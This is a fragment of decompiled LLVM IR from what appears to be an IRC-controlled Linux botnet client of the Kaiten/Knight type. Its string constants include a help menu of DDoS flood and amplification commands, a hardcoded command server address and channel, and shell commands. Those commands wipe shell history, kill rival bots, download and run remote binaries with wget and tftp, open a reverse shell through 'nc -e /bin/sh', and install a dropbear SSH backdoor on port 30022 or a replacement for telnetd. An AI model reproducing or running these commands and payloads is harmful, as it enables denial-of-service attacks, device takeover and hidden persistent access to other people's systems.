[9 x i8]* @global_var_80674b5.418, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_80674be.419, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_80674c7.420, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_80674cf.421, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_80674da.422, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_80674ea.423, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_80674f2.424, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_80674fa.425, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_8067503.426, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_806750d.427, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8067516.428, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_806751b.429, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_806751e.430, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_8067529.328, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_8067531.431, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_8067538.432, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_806753b.433, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_806753e.434, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_8067541.435, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_8067544.436, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_8067547.437, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_806754a.438, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_806754d.439, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_8067550.440, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8067553.441, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8067557.442, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_806755b.443, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_806755f.444, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8067563.445, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8067567.446, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_806756b.447, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_806756f.448, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8067573.449, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8067577.450, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_806757b.451, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8067582.452, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8067588.453, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_806758d.454, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_8067592.455, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_8067599.456, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_80675a1.457, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_80675a9.458, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_80675b1.459, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_80675ba.460, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_80675c2.461, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_80675c9.462, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_80675d2.463, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_80675da.464, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_80675df.465, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_80675e6.466, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_80675ed.467, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_80675f4.468, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_80675fb.469, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_8067601.470, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_806760a.471, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8067610.472, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8067615.473, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_806761b.474, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_8067621.475, i32 0, i32 0)]
@global_var_806a608.477 = constant [123 x i8] c"pkill -9 %s || busybox pkill -9 %s || /usr/busybox pkill -9 %s || /bin/busybox pkill -9 %s || /var/run/busybox pkill -9 %s\00"
@global_var_806a683.478 = constant [22 x i8] c"history -c;history -w\00"
@global_var_806a699.479 = constant [29 x i8] c"cd /root;rm -f .bash_history\00"
@global_var_806a6b6.480 = constant [21 x i8] c"cd /var/tmp; rm -f *\00"
@global_var_806a6cb.481 = constant [30 x i8] c"NOTICE %s :%s resolves to %s\0A\00"
@global_var_806a6e9.482 = constant [28 x i8] c"NOTICE %s :DNS2IP <domain>\0A\00"
@global_var_806a708.483 = constant [40 x i8] c"NOTICE %s :UPDATEHTTP <host> <src:bin>\0A\00"
@global_var_806a730.484 = constant [96 x i8] c"NOTICE %s :Unable to create socket (Wierd, you shouldnt get this error and ITS NOT MY FAULT!).\0A\00"
@global_var_806a790.485 = constant [11 x i8] c"gcc --help\00"
@global_var_806a79b.486 = constant [6 x i8] c"Usage\00"
@global_var_806a7a1.487 = constant [30 x i8] c"NOTICE %s :Receiving update.\0A\00"
@global_var_806a7bf.488 = constant [11 x i8] c"mkdir /tmp\00"
@global_var_806a7ca.489 = constant [8 x i8] c"/tmp/.c\00"
@global_var_807d400.490 = global i32 0
@global_var_806a7d4.491 = constant [70 x i8] c"(gcc -o %s /tmp/.c; rm -f /tmp/.c; kill -9 %d; %s &) > /dev/null 2>&1\00"
@global_var_806a81a.492 = constant [8 x i8] c"/tmp/.o\00"
@global_var_806a824.493 = constant [188 x i8] c"export PATH=/usr/sbin:/bin:/usr/bin:/sbin:/var/bin;chmod +x /tmp/.o; trap '' 1;sh -c '/var/bin/killall knight*;/var/bin/killall kt*;/var/bin/killall .o;/var/bin/sleep 5;trap  1;/tmp/.o '&\00"
@global_var_806a8e0.494 = constant [26 x i8] c"NOTICE %s :MOVE <server>\0A\00"
@global_var_807d504.495 = local_unnamed_addr global i32 0
@global_var_80748e4.496 = local_unnamed_addr global i32 0
@global_var_806a8fa.497 = constant [9 x i8] c"/var/bin\00"
@global_var_806a904.498 = constant [40 x i8] c"NOTICE %s :HACKPGK <url> <binary name>\0A\00"
@global_var_806a92c.499 = constant [277 x i8] c"GET /%s HTTP/1.1\0D\0AConnection: Keep-Alive\0D\0AUser-Agent: HackZilla/1.67 [en] (X11; U; Linux 2.2.16-3 x64)\0D\0AHost: %s:80\0D\0AAccept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*\0D\0AAccept-Encoding: gzip\0D\0AAccept-Language: en\0D\0AAccept-Charset: iso-8859-1,*,utf-8\0D\0A\0D\0A\00"
@global_var_806aa44.500 = constant [39 x i8] c"NOTICE %s :Installed %s to hack path.\0A\00"
@global_var_806aa6b.501 = constant [21 x i8] c"cat %s > /var/bin/%s\00"
@global_var_806aa80.502 = constant [9 x i8] c"rm -f %s\00"
@global_var_806aa89.503 = constant [22 x i8] c"chmod 775 /var/bin/%s\00"
@global_var_806aa9f.504 = constant [18 x i8] c"ls -l /var/bin/%s\00"
@global_var_806aab4.505 = constant [55 x i8] c"NOTICE %s :Non-root/non-spoof DDoS commands commands:\0A\00"
@global_var_806aaec.506 = constant [69 x i8] c"NOTICE %s :    STD <host> <port> <time> = A non spoofed STD flooder\0A\00"
@global_var_806ab34.507 = constant [84 x i8] c"NOTICE %s :    OVH <host> <port> <throttle> <time> = A non spoofed UDP OVH flooder\0A\00"
@global_var_806ab88.508 = constant [84 x i8] c"NOTICE %s :    vTCP <ip> <port> <time> = A non spoofed Randomizer TCP flooder Flag\0A\00"
@global_var_806abdc.509 = constant [74 x i8] c"NOTICE %s :    HOLD <host> <port> <time> = A vanilla TCP connect flooder\0A\00"
@global_var_806ac28.510 = constant [75 x i8] c"NOTICE %s :    JUNK <host> <port> <time> = A vanilla TCP flooder (modded)\0A\00"
@global_var_806ac74.511 = constant [143 x i8] c"NOTICE %s :    UNKNOWN <target> <port, 0 for random> <packet size, 0 for random> <secs> = An advanced non spoof UDP flooder modified by Freak\0A\00"
@global_var_806ad04.512 = constant [105 x i8] c"NOTICE %s :    HTTP <method> <target> <port> <path> <time> <power> = An extremely powerful HTTP flooder\0A\00"
@global_var_806ad70.513 = constant [60 x i8] c"NOTICE %s :    WGETFLOOD <url> <secs> = An HTTP(S) flooder\0A\00"
@global_var_806adac.514 = constant [33 x i8] c"NOTICE %s :Spoof/root commands:\0A\00"
@global_var_806add0.515 = constant [59 x i8] c"NOTICE %s :    UDP <target> <port> <secs> = A UDP flooder\0A\00"
@global_var_806ae0c.516 = constant [124 x i8] c"NOTICE %s :    VSET <method> <target> <thread> <time> = Valve Source Engine Flood, using the TQuery Engine Source EXPLOIT.\0A\00"
@global_var_806ae88.517 = constant [105 x i8] c"NOTICE %s :    PAN <target> <port> <secs> = An advanced syn flooder that will kill most network drivers\0A\00"
@global_var_806aef4.518 = constant [166 x i8] c"NOTICE %s :    TCP <target> <port> <time> <flags> <packetsize> <pollinterval> <threads> = An advanced TCP flooder with multithreading. Will kill almost any service.\0A\00"
@global_var_806af9c.519 = constant [95 x i8] c"NOTICE %s :    GIGATCP Flooding <target> <flags/method> <secs> = Advanced Spoofed TCP Flooder\0A\00"
@global_var_806affc.520 = constant [141 x i8] c"NOTICE %s :    BLACKNURSE <target ip> <secs> = An ICMP packet flooder that will crash most firewalls and use loads of CPU. USE EXTREME CARE\0A\00"
@global_var_806b08c.521 = constant [85 x i8] c"NOTICE %s :    SOCKSTRESS <ip>:<port> <interface> -s <time> [-p payload] [-d delay]\0A\00"
@global_var_806b0e4.522 = constant [152 x i8] c"NOTICE %s :    NTP <target IP> <target port> <reflection file url> <threads> <pps limiter, -1 for no limit> <time> = A NTP DrDoS flooder. Very potent.\0A\00"
@global_var_806b17c.523 = constant [114 x i8] c"NOTICE %s :    DNS <IP> <port> <reflection file url> <threads> <time> = A DNS DrDoS flooder. Almost unblockable.\0A\00"
@global_var_806b1f0.524 = constant [159 x i8] c"NOTICE %s :    SNMP <IP> <port> <reflection file url> <threads> <pps limiter, -1 for no limit> <time> =   SNMP DrDoS flooder. Insane amp factor (600 - 1700x)\0A\00"
@global_var_806b28f.525 = constant [28 x i8] c"NOTICE %s :Other commands:\0A\00"
@global_var_806b2ac.526 = constant [54 x i8] c"NOTICE %s :    RNDNICK = Randomizes the knights nick\0A\00"
@global_var_806b2e4.527 = constant [61 x i8] c"NOTICE %s :    NICK <nick> = Changes the nick of the client\0A\00"
@global_var_806b324.528 = constant [50 x i8] c"NOTICE %s :    SERVER <server> = Changes servers\0A\00"
@global_var_806b358.529 = constant [54 x i8] c"NOTICE %s :    GETSPOOFS = Gets the current spoofing\0A\00"
@global_var_806b390.530 = constant [63 x i8] c"NOTICE %s :    SPOOFS <subnet> = Changes spoofing to a subnet\0A\00"
@global_var_806b3d0.531 = constant [66 x i8] c"NOTICE %s :    DISABLE = Disables all packeting from this client\0A\00"
@global_var_806b414.532 = constant [64 x i8] c"NOTICE %s :    ENABLE = Enables all packeting from this client\0A\00"
@global_var_806b454.533 = constant [40 x i8] c"NOTICE %s :    KILL = Kills the knight\0A\00"
@global_var_806b47c.534 = constant [32 x i8] c"NOTICE %s :    DNS2IP <domain>\0A\00"
@global_var_806b49c.535 = constant [101 x i8] c"NOTICE %s :    GET <http address> <save as> = Downloads a file off the web and saves it onto the hd\0A\00"
@global_var_806b504.536 = constant [66 x i8] c"NOTICE %s :    UPDATE <http address> <src:bin> = Update this bot\0A\00"
@global_var_806b548.537 = constant [108 x i8] c"NOTICE %s :    HACKPKG <http address> <bin name> = HackPkg is here! Install a bin, using http, no depends!\0A\00"
@global_var_806b5b4.538 = constant [53 x i8] c"NOTICE %s :    VERSION = Requests version of client\0A\00"
@global_var_806b5ec.539 = constant [54 x i8] c"NOTICE %s :    KILLALL = Kills all current packeting\0A\00"
@global_var_806b624.540 = constant [37 x i8] c"NOTICE %s :    HELP = Displays this\0A\00"
@global_var_806b64c.541 = constant [65 x i8] c"NOTICE %s :    IRC <command> = Sends this command to the server\0A\00"
@global_var_806b690.542 = constant [50 x i8] c"NOTICE %s :    SH <command> = Executes a command\0A\00"
@global_var_806b6c4.543 = constant [66 x i8] c"NOTICE %s :    ISH <command> = SH, interactive, sends to channel\0A\00"
@global_var_806b708.544 = constant [69 x i8] c"NOTICE %s :    SHD <command> = Executes a psuedo-daemonized command\0A\00"
@global_var_806b750.545 = constant [59 x i8] c"NOTICE %s :    GETBB <tftp server> = Get a proper busybox\0A\00"
@global_var_806b78c.546 = constant [92 x i8] c"NOTICE %s :    INSTALL  <http server/file_name> = Download & install a binary to /var/bin \0A\00"
@global_var_806b7e8.547 = constant [59 x i8] c"NOTICE %s :    BASH <cmd> = Execute commands using bash. \0A\00"
@global_var_806b824.548 = constant [88 x i8] c"NOTICE %s :    BINUPDATE <http:server/package> = Update a binary in /var/bin via wget \0A\00"
@global_var_806b87c.549 = constant [93 x i8] c"NOTICE %s :    SCAN <nmap options> = Call the nmap wrapper script and scan with your opts. \0A\00"
@global_var_806b8dc.550 = constant [80 x i8] c"NOTICE %s :    RSHELL <server> <port> = Equates to nohup nc ip port -e /bin/sh\0A\00"
@global_var_806b92c.551 = constant [102 x i8] c"NOTICE %s :    LOCKUP <http:server> = Kill telnet, d/l aes backdoor from <server>, run that instead.\0A\00"
@global_var_806b994.552 = constant [111 x i8] c"NOTICE %s :    GETSSH <http:server/dropbearmulti> = D/l, install, configure and start dropbear on port 30022.\0A\00"
@global_var_806ba03.553 = constant [28 x i8] c"NOTICE %s :Killing pid %d.\0A\00"
@global_var_806ba1f.555 = constant [21 x i8] c"kill -9 %d;kill -9 0\00"
@global_var_806ba34.556 = constant [5 x i8] c"%s%s\00"
@global_var_806ba39.557 = constant i32 1330511905
@global_var_806ba3b.558 = constant [29 x i8] c"NOTICE %s :History cleared!\0A\00"
@global_var_806f8ac.559 = local_unnamed_addr global i32 2
@global_var_80671ee.560 = constant [12 x i8] c"Kuze-senpai\00"
@global_var_80671fa.561 = constant [9 x i8] c"Morpheus\00"
@global_var_806f8b0.562 = global [2 x i8*] [i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_80671ee.560, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_80671fa.561, i32 0, i32 0)]
@global_var_806bb50.563 = constant [5 x i8] c"IRC \00"
@global_var_806bb55.564 = constant [4 x i8] c"%s\0A\00"
@global_var_806bb59.565 = constant [4 x i8] c"SH \00"
@global_var_806bb60.566 = constant [69 x i8] c"export PATH=/var/bin:/bin:/sbin:/usr/bin:/usr/local/bin:/usr/sbin;%s\00"
@global_var_806bba5.567 = constant [15 x i8] c"NOTICE %s :%s\0A\00"
@global_var_806bbb4.568 = constant [5 x i8] c"SHD \00"
@global_var_806bbbc.569 = constant [100 x i8] c"export HOME=/tmp;export;export PATH=/bin:/sbin:/usr/bin:/usr/sbin:/var/bin;trap '' 1 2; sh -c '%s'&\00"
@global_var_806bc20.570 = constant [7 x i8] c"GETBB \00"
@global_var_806bc28.571 = constant [330 x i8] c"export fileGet=busybox-mips;export PATH=/bin:/sbin:/usr/bin:/usr/sbin:/var/bin;cd /var;(([ ! -e /var/\22$fileGet\22 ] || [ ! -s /var/\22$fileGet\22 ]) && tftp -g -r \22$fileGet\22 %s && chmod +x \22$fileGet\22 && ./\22$fileGet\22 mkdir bin && ./\22$fileGet\22 --install -s /var/bin && ls -l \22$fileGet\22 || echo It appears we already have /var/\22$fileGet\22)\00"
@global_var_806bd72.572 = constant [8 x i8] c"GETSSH \00"
@global_var_806bd7c.573 = constant [668 x i8] c"export PATH=/var/bin:/bin:/sbin:/usr/bin:/usr/sbin;cd /tmp;export url=%s;name=`echo \22$url\22 | sed 's#.*/##'` && wget -O \22$name\22 \22$url\22;chmod +x \22$name\22;mv \22$name\22 /var/bin;ls -l /var/bin/\22$name\22 && dss=/var/dbs/dropbear_dss_host_key;rsa=/var/dbs/dropbear_rsa_host_key;ecd=/var/dbs/dropbear_ecdsa_host_key;cd /var/bin;for i in dropbear dbclient dropbearkey dropbearconvert;do ln -s /var/bin/dropbearmulti $i;done;[ ! -d /var/dbs ] && mkdir /var/dbs;[ -f $dss ] || dropbearkey -t dss -f $dss;[ -f $rsa ] || dropbearkey -t rsa -f $rsa;[ -f $ecd ] || dropbearkey -t ecdsa -f $ecd;dropbear -r $dss -r $rsa -r $ecd -p 30022;iptables -I INPUT 1 -p tcp --dport 30022 -j ACCEPT\00"
@global_var_806c018.574 = constant [9 x i8] c"INSTALL \00"
@global_var_806c024.575 = constant [389 x i8] c"export PATH=/bin:/sbin:/usr/bin:/usr/sbin:/var/bin;export url=%s;export name=`echo \22$url\22 | sed 's#.*/##'`;(([ ! -e /var/bin/$name ] || [ ! -s /var/bin/$name ]) && echo \22$name either doesnt exist or eq 0 so we get\22 && cd /tmp && wget -O \22$name\22 \22$url\22 && chmod +x \22$name\22 && mv \22$name\22 /var/bin && ([ -f /var/bin/$name ] && ls -l /var/bin/$name) || echo \22It appears I already have $name\22)\00"
@global_var_806c1a9.576 = constant [11 x i8] c"BINUPDATE \00"
@global_var_806c1b4.577 = constant [371 x i8] c"export PATH=/bin:/sbin:/usr/bin:/usr/sbin:/var/bin;export url=%s;export name=`echo \22$url\22 | sed 's#.*/##'`;([ -e /var/bin/$name ]) && echo $name exists so we delete it... && rm /var/bin/$name && cd /tmp && wget -O $name $url && chmod +x $name && mv $name /var/bin && ([ -f /var/bin/$name ] && ls -l /var/bin/$name) || echo \22$name doesnt exist, perhaps you mean INSTALL?\22\00"
@global_var_806c327.578 = constant [8 x i8] c"LOCKUP \00"
@global_var_806c330.579 = constant [235 x i8] c"export PATH=/var/bin:/bin:/sbin:/usr/bin:/usr/sbin;export HOME=/tmp;[ ! -f /var/bin/dmips ] && cd /var/bin;wget -O dmips %s;chmod +x /var/bin/dmips;(killall -9 telnetd || kill -9 telnetd) && (nohup dmips || trap '' 1 2 /var/bin/dmips)\00"
@global_var_806c41b.580 = constant [8 x i8] c"RSHELL \00"
@global_var_806c424.581 = constant [114 x i8] c"export HOME=/tmp;export PATH=/var/bin:/bin:/sbin:/usr/bin:/usr/sbin;trap '' 1 2; sh -c 'nohup nc %s -e /bin/sh '&\00"
@global_var_806c496.582 = constant [6 x i8] c"SCAN \00"
@global_var_806c49c.583 = constant [406 x i8] c"export HOME=/tmp;export PATH=/var/bin:/bin:/sbin:/usr/bin:/usr/sbin;(([ ! -x /var/bin/scan ] || [ ! -x /var/bin/nmap ]) && echo \22I am missing either scan or nmap, and Shellzrus was on Xanax when he wrote this, so you need to do INSTALL http:/\5Cserver/nmap and INSTALL http://server/scan first...\22 && ([ -f /var/bin/nmap ] && ls -l /var/bin/nmap) && ([ -f /var/bin/scan ] && ls -l /var/bin/scan) || scan %s)\00"
@global_var_806c632.584 = constant [6 x i8] c"BASH \00"
@global_var_806c638.585 = constant [98 x i8] c"export HOME=/tmp;export SHELL=/var/bin/bash;export PATH=/bin:/sbin:/usr/bin:/usr/sbin:/var/bin;%s\00"
@global_var_8068669.586 = constant i32 808452096
@global_var_806ba58.587 = constant [4 x i8] c"STD\00"
@global_var_806ffc0.588 = local_unnamed_addr global [4 x i8]* @global_var_806ba58.587
@global_var_806ffc4.589 = local_unnamed_addr global i32 134542350
@global_var_806c69a.590 = constant [13 x i8] c"MODE %s -xi\0A\00"
@global_var_807e53c.591 = local_unnamed_addr global i32 0
@global_var_806c6a7.592 = constant [13 x i8] c"JOIN %s :%s\0A\00"
@global_var_806c6b4.593 = constant [8 x i8] c"WHO %s\0A\00"
@global_var_806c6bc.594 = constant [9 x i8] c"PONG %s\0A\00"
@global_var_806c6c8.595 = constant [93 x i8] c"NOTICE %s :I'm having a problem resolving my host, someone will have to SPOOFS me manually.\0A\00"
@global_var_80671e0.600 = constant [14 x i8] c"89.46.222.250\00"
@global_var_806f8a4.601 = global [14 x i8]* @global_var_80671e0.600
@global_var_807d2c4.602 = local_unnamed_addr global i32 0
@global_var_807d2c8.603 = local_unnamed_addr global i32 0
@global_var_807d2cc.604 = local_unnamed_addr global i32 0
@global_var_807d2d0.605 = local_unnamed_addr global i32 0
@global_var_807d3f0.606 = local_unnamed_addr global i32 0
@global_var_806c742.607 = constant [7 x i8] c"#owari\00"
@global_var_806c749.608 = constant i32 1308622848
@global_var_806c74c.609 = constant [48 x i8] c"NICK [%s|%s]%s\0AUSER %s localhost localhost :%s\0A\00"
@global_var_806c77c.610 = constant i32 1380253706
@global_var_806c725.611 = constant [4 x i8] c"352\00"
@global_var_8070100.612 = global [4 x i8]* @global_var_806c725.611
@global_var_8070104.613 = global i32 134567650
@global_var_806c77e.614 = constant [6 x i8] c"ERROR\00"
@global_var_8074160 = external global i32
@global_var_8078e6c.615 = local_unnamed_addr global i32 0
@global_var_8078e70.616 = local_unnamed_addr global i32 0
@global_var_8074340.617 = global i32 0
@global_var_8078e74.618 = local_unnamed_addr global i32 0
@global_var_807e578.619 = local_unnamed_addr global i32 0
@global_var_8074358.620 = local_unnamed_addr global i32 0
@global_var_8074354.621 = local_unnamed_addr global i32 0
@global_var_8078d20.622 = local_unnamed_addr global i32 0
@global_var_8078d24.623 = local_unnamed_addr global i32 0
@global_var_8074524.624 = local_unnamed_addr global i32 -1
@global_var_8074520.625 = local_unnamed_addr global i32* @global_var_8074160
@global_var_807e588.626 = local_unnamed_addr global i32 0
@global_var_8074530.627 = local_unnamed_addr global i32 34
@global_var_8070140.628 = global i32 0
@global_var_8074140.629 = local_unnamed_addr global i32 2
@global_var_807e57c.630 = local_unnamed_addr global i32 0
@global_var_807e584.631 = local_unnamed_addr global i32 0
@global_var_8074388.632 = global i32 0
@global_var_8074384.633 = local_unnamed_addr global i32* @global_var_8074388.632
@global_var_807438c.634 = local_unnamed_addr global i32 0
@global_var_8074390.635 = global i32 0
@global_var_807452c.636 = local_unnamed_addr global i32 33
@global_var_8074538.637 = local_unnamed_addr global i32 134579449
@global_var_807d134.638 = local_unnamed_addr global i32 0
@global_var_8078d28.639 = local_unnamed_addr global i32 0
@global_var_8078e78.640 = local_unnamed_addr global i32 0
@global_var_8078e7c.641 = local_unnamed_addr global i32 0
@global_var_8070150.642 = global i32 0
@global_var_807435c.643 = local_unnamed_addr global i32* @global_var_8070150.642
@global_var_8078d2c.644 = global i32 0
@global_var_8078d44.645 = global i32 0
@global_var_8078d48.646 = global i32 0
@global_var_8078d4c.647 = global i32 0
@global_var_8074750.648 = global i32 0
@global_var_805753c.649 = constant i32 -2062498685
@global_var_8078d60.650 = global i32 0
@global_var_8057594.651 = constant i32 -2057255805
@global_var_8074528.652 = local_unnamed_addr global i32 32
@global_var_80574c4.653 = constant i32 -1193113149
@global_var_8078e68.654 = global i32 0
@global_var_8078e64.655 = local_unnamed_addr global i32 0
@global_var_80745f8.656 = local_unnamed_addr global i32 35
@global_var_80745fc.657 = local_unnamed_addr global i32 64
@global_var_8078e84.658 = local_unnamed_addr global i32 0
@global_var_8070160.659 = global i32 0
@global_var_807e590.660 = local_unnamed_addr global i32 0
@global_var_807aed8.661 = global i32 0
@global_var_807aedc.662 = global i32 0
@global_var_8074174.663 = local_unnamed_addr global i32 0
@global_var_8074660.664 = global i32 288
@global_var_807461c.665 = global i32* @global_var_8074660.664
@global_var_80741a4.666 = local_unnamed_addr global i32* @global_var_807aed8.661
@global_var_80741ac.667 = local_unnamed_addr global i32* @global_var_807aedc.662
@global_var_8074650.668 = local_unnamed_addr global i32 2
@global_var_8078e80.669 = local_unnamed_addr global i32 0
@global_var_807e58c.670 = local_unnamed_addr global i32 0
@global_var_80742fc.671 = local_unnamed_addr global i32 0
@global_var_80744ec.673 = local_unnamed_addr global i32 0
@global_var_80744e8.674 = local_unnamed_addr global i32 0
@global_var_8074350.675 = local_unnamed_addr global i32 0
@global_var_8078e88.676 = global i32 0
@global_var_8078ea0.677 = global i32 0
@global_var_8078eac.678 = local_unnamed_addr global i32 0
@global_var_805a11a.679 = constant [4 x i8] c"XZj\00"
@global_var_8078ec0.680 = global i32 0
@global_var_8078ec4.681 = global i32 0
@global_var_807aec0.682 = global i32 0
@global_var_80746b0.684 = local_unnamed_addr global i32 272
@global_var_8074638.686 = global i32 0
@global_var_807aefc.687 = local_unnamed_addr global i32 0
@global_var_807af00.688 = local_unnamed_addr global i32 0
@global_var_806e3f7.689 = constant [3 x i8] c": \00"
@global_var_806e3f9.690 = constant i32 539828224
@global_var_806cae0.691 = constant [8 x i8] c"%s%s%m\0A\00"
@global_var_8074610 = external local_unnamed_addr global i32
@global_var_807aee0.692 = global i32 0
@global_var_807aef8.693 = local_unnamed_addr global i32 0
@global_var_806cae8.694 = constant [3 x i8] c"-c\00"
@global_var_806caf0.695 = constant [3 x i8] c"sh\00"
@global_var_806caeb.696 = constant [8 x i8] c"/bin/sh\00"
@global_var_8074620.697 = global i32 0
@global_var_806caf4.698 = constant i32 0
@global_var_806cb0c.699 = constant [6 x i8] c"(nil)\00"
@global_var_806cb12.700 = constant [7 x i8] c"(null)\00"
@global_var_806cb19.701 = constant i32 2949163
@global_var_806cb86.703 = constant i32 327688
@global_var_8074860 = external local_unnamed_addr global i32
@global_var_806de80.705 = constant i32 65536
@global_var_806cb7e.706 = constant [8 x i8] c" +0-#'I\00"
@global_var_806cb2c.707 = constant [9 x i8] c"hlLjztqZ\00"
@global_var_806cb69.708 = constant [21 x i8] c"npxXoudifFeEgGaACScs\00"
@global_var_806cb5f.709 = constant i32 117506048
@global_var_806cb50.710 = constant i32 331776
@global_var_806cbc0.711 = constant [8 x i8] c"Success\00"
@global_var_806cbaa.712 = constant [15 x i8] c"Unknown error \00"
@global_var_8074868.713 = local_unnamed_addr global i32* @global_var_806de80.705
@global_var_807cf20.714 = global i32 0
@global_var_806d740.716 = constant i32 0
@global_var_806d798.717 = constant i32 0
@global_var_806d71c.718 = constant i32 10
@global_var_806d777.719 = constant [17 x i8] c"0123456789abcdef\00"
@global_var_806d774.721 = constant [3 x i8] c"%x\00"
@global_var_807cf24.722 = global i32 0
@global_var_807cf40.723 = global i32 0
@global_var_807d10c.724 = global i32 0
@global_var_80748a0.725 = global i32 0
@global_var_807ea60.726 = local_unnamed_addr global i32 0
@global_var_807ea54.727 = global i32 0
@global_var_806d7a8.728 = constant [25 x i8] c"%u.%u.%u.%u.in-addr.arpa\00"
@global_var_806d7c1.729 = constant [7 x i8] c"%x.%x.\00"
@global_var_806d7c8.730 = constant [9 x i8] c"ip6.arpa\00"
@global_var_807e5a0.731 = global i32 0
@global_var_807e64c.733 = global i32 0
@global_var_807e650.734 = local_unnamed_addr global i32 0
@global_var_807e654.735 = global i32 0
@global_var_807e660.736 = local_unnamed_addr global i32 0
@global_var_807e954.737 = global i32 0
@global_var_807e97c.738 = local_unnamed_addr global i32 0
@global_var_807e96c.739 = local_unnamed_addr global i32 0
@global_var_807e970.740 = local_unnamed_addr global i32 0
@global_var_807e974.741 = local_unnamed_addr global i32 0
@global_var_807e978.742 = local_unnamed_addr global i32 0
@global_var_807e984.743 = local_unnamed_addr global i32 0
@global_var_807e990.744 = local_unnamed_addr global i32 0
@global_var_807e988.745 = local_unnamed_addr global i32 0
@global_var_807e994.746 = local_unnamed_addr global i32 0
@global_var_807e968.747 = local_unnamed_addr global i32 0
@global_var_807e964.749 = local_unnamed_addr global i32 0
@global_var_807e98c.750 = local_unnamed_addr global i32 0
@global_var_807e65c.751 = local_unnamed_addr global i32 0
@global_var_8074768.752 = global i32 0
@global_var_8074780.754 = global i32 0
@global_var_8074798 = external global i32
@global_var_80747c4.756 = global i32 -1726662223
@global_var_80747a0.757 = local_unnamed_addr global i32* @global_var_80747c4.756
@global_var_807479c.758 = global i32* @global_var_80747c4.756
@global_var_806d7f4.759 = constant i32 0
@global_var_806d7e0.760 = constant i32 0
@global_var_8074840.761 = global i32 0
@global_var_807d124.762 = local_unnamed_addr global i32 0
@global_var_807d130.763 = local_unnamed_addr global i32 0
@global_var_807d128.765 = global i32 0
